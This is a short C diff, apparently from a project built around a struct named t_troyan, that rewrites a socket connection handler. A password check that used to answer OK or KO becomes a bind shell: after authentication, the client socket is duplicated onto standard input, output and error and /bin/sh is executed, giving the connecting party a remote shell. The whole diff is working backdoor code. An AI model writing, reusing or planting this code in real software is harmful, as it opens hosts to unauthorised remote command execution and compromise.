@@ -32,24 +32,24 @@ int init_servsocket(t_troyan *shield)
     return (0);
 }
 
+
 void    ft_connection(t_troyan *shield, int socket_client)
 {
-    char    buffer[1024];
-    int     bytes_read;
+    char *args[] = {"/bin/sh", NULL};
 
-    (void)shield;
-    bytes_read = recv(socket_client, buffer, sizeof(buffer) -1, 0);
-    if (bytes_read > 0)
+    if (ft_auth(socket_client) == 0)
     {
-        buffer[bytes_read] = '\0';
-        buffer[strcspn(buffer, "\r\n")] = '\0';                 // Quitar los saltos de línea
+        dup2(socket_client, 0);
+        dup2(socket_client, 1);
+        dup2(socket_client, 2);
 
-        if (strcmp(buffer, PASSWORD) == 0)
-            send(socket_client, "OK\n", 3, 0);
-        else
-            send(socket_client, "KO\n", 3, 0);
+        close(socket_client);
+
+        execve("/bin/sh", args, shield->env);
+        exit (1);
     }
-    close(socket_client);
+    else
+        close(socket_client);
 }
 
 int loop_server(t_troyan *shield)
